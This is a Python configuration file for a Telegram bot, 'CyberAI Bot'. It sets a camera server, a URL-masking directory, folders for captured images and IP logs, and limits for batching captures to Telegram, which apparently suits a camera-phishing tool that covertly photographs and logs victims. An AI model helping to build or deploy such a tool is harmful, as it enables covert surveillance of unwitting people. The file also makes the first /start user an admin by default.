"""
CyberAI Bot — Configuration Management
Loads settings from .env file and provides defaults.
"""

import os
from pathlib import Path
from dotenv import load_dotenv

# Load .env from project root
PROJECT_ROOT = Path(__file__).resolve().parent.parent
load_dotenv(PROJECT_ROOT / ".env")

# ── Telegram Bot ──────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "")

# Comma-separated list of admin Telegram user IDs
_admin_ids_str = os.getenv("ADMIN_IDS", "")
ADMIN_IDS = [int(uid.strip()) for uid in _admin_ids_str.split(",") if uid.strip().isdigit()]

# If ADMIN_IDS is empty, first user to /start becomes admin
OPEN_REGISTRATION = len(ADMIN_IDS) == 0

# ── Camera Server ─────────────────────────────────────────────
CAM_SERVER_HOST = os.getenv("CAM_SERVER_HOST", "0.0.0.0")
CAM_SERVER_PORT = int(os.getenv("CAM_SERVER_PORT", "5000"))

# ── Health Check (Render / Cloud Platforms) ───────────────────
# Render sets PORT env var and expects an HTTP server listening on it.
# Without this, Render marks the instance as unhealthy and kills it.
HEALTH_CHECK_PORT = int(os.getenv("PORT", "10000"))

# ── Paths ─────────────────────────────────────────────────────
OWN_CAM_DIR = PROJECT_ROOT / "own-cam"
URL_MASKER_DIR = PROJECT_ROOT / "url_masker"
CAPTURED_DIR = OWN_CAM_DIR / "captured"
IP_LOGS_DIR = OWN_CAM_DIR / "ip_logs"
DATA_DIR = PROJECT_ROOT / "bot" / "data"
SESSIONS_FILE = DATA_DIR / "sessions.json"
HISTORY_FILE = DATA_DIR / "history.json"

# Ensure data directories exist
CAPTURED_DIR.mkdir(parents=True, exist_ok=True)
IP_LOGS_DIR.mkdir(parents=True, exist_ok=True)
DATA_DIR.mkdir(parents=True, exist_ok=True)

# ── Limits ────────────────────────────────────────────────────
MAX_TELEGRAM_FILE_SIZE = 50 * 1024 * 1024  # 50 MB
MAX_PHOTO_ALBUM_SIZE = 10  # Telegram max media group size
CAPTURE_BATCH_INTERVAL = 5  # seconds between batched image sends
MAX_CAPTURES_PER_BATCH = 5  # max images per batch send

# ── Logging ───────────────────────────────────────────────────
LOG_LEVEL = os.getenv("LOG_LEVEL", "INFO")
LOG_FILE = DATA_DIR / "bot.log"
